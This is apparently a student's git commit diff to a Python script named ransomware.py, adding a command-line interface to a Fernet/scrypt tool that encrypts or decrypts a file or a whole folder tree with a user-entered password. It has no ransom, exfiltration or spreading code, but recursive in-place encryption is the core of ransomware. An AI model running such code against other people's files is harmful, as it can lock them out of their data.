20dd3e3d223fad9ced3d625619747c5f59b8765b
Raubeel <siniorchair>
2025-07-31 19:53:30 -0700

    Ransomware

--- ransomware.py
+++ ransomware.py
@@ -2,12 +2,13 @@ import pathlib,secrets,base64,getpass
 import cryptography
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+from pathlib import Path
 
 print("Script is running inside virtual environment!")
 
-password="Rabeelthecsstudent"
-filename=""
-foldername=""
+#password="Rabeelthecsstudent"    # We are not using this because of the argpase code at the buttom
+#filename=""                      # This too
+#foldername=""                     #This too
 
 def generate_salt(size=16):
     return secrets.token_bytes(size)
@@ -42,8 +43,8 @@ def encrypt(filename,key):
         print("File has been ecypted successfully")
             
 
-#key=generate_key(password)
-#encrypt(filename,key)
+#key=generate_key(password)     # We are not using this because of the folder encryption code at the buttom
+#encrypt(filename,key)          # We are not using this because of the folder encryption code at the buttom
 
 def decrypt(filename,key):
     f=Fernet(key)
@@ -61,28 +62,73 @@ def decrypt(filename,key):
         file.write(decrypted_data)
         print("file has been decrytped successfully ")
 
-#key=generate_key(password)
-#decrypt(filename,key)
+#key=generate_key(password)                 # We are not using this because of the folder encryption code at the buttom
+#decrypt(filename,key)                        # We are not using this because of the folder encryption code at the buttom
 
 
 
 #Now we need to learn how to decrypt and encrypt folder not just files 
-def encrypt_folders(foldername,key):
+def encrypt_folder(foldername,key):
     for child in pathlib.Path(foldername).glob("*"):
         if child.is_file():
-            print("Encrypting {child}")
+            print(f"Encrypting {child}")
             encrypt(child,key)
         elif child.is_dir():
-            encrypt_folders(child,key)
+            encrypt_folder(child,key)
 
 def decrypt_folder(foldername,key):
     for child in pathlib.Path(foldername).glob("*"):
         if child.is_file():
-            print("Decrypting {child}")
+            print(f"Decrypting {child}")
             decrypt(child,key)
         elif child.is_dir():
-            print("Decrypting {child}")
+            print(f"Decrypting {child}")
             decrypt_folder(child,key)
-key=generate_key(password)
+#key=generate_key(password)
 #encrypt_folders(foldername,key)
 #decrypt_folder(foldername,key)
+
+import argparse
+parser =argparse.ArgumentParser(description="File encryptor with a password")
+parser.add_argument('path',help="Path to ecrypt or decrypt,and be a file or and entire folder")
+
+parser.add_argument('-e',"--encrypt",action="store_true",help="whether to encrypt the file/folder.Only -e or -d can be specified")
+parser.add_argument('-d',"--decrypt",action="store_true",help="whether to decrypt the file/folder.Only -e or -d can be specified")
+args=parser.parse_args()
+
+if args.encrypt:
+    password=getpass.getpass("Enter the password for encryption ")
+elif args.decrypt:
+    password=getpass.getpass("Enter the password for decryption ")
+
+
+encrypt_=args.encrypt
+decrypt_=args.decrypt
+target =Path(args.path)
+
+if not target.exists():
+    print(f"Filename or foldername {target} does not exist")
+if encrypt_ and decrypt_:
+    raise TypeError('Plase specify whether to decrypt or encrypt')
+elif encrypt_:
+    if target.is_file():
+        key =generate_key(password)
+        encrypt(filename=target,key=key)
+
+        print("successfully encrytped")
+    elif target.is_dir():
+        key =generate_key(password)
+        encrypt_folder(foldername=target,key=key)
+        print("successfully encrytped")
+elif decrypt_:
+    if target.is_file():
+        key =generate_key(password)
+        decrypt(filename=target,key=key)
+        print("successfully decrypted")
+    elif target.is_dir():
+        key =generate_key(password)
+        decrypt_folder(foldername=target,key=key)
+        print("successfully decrypted")
+else:
+    raise TypeError("Please specify whether to decrypt or encrypt")
+
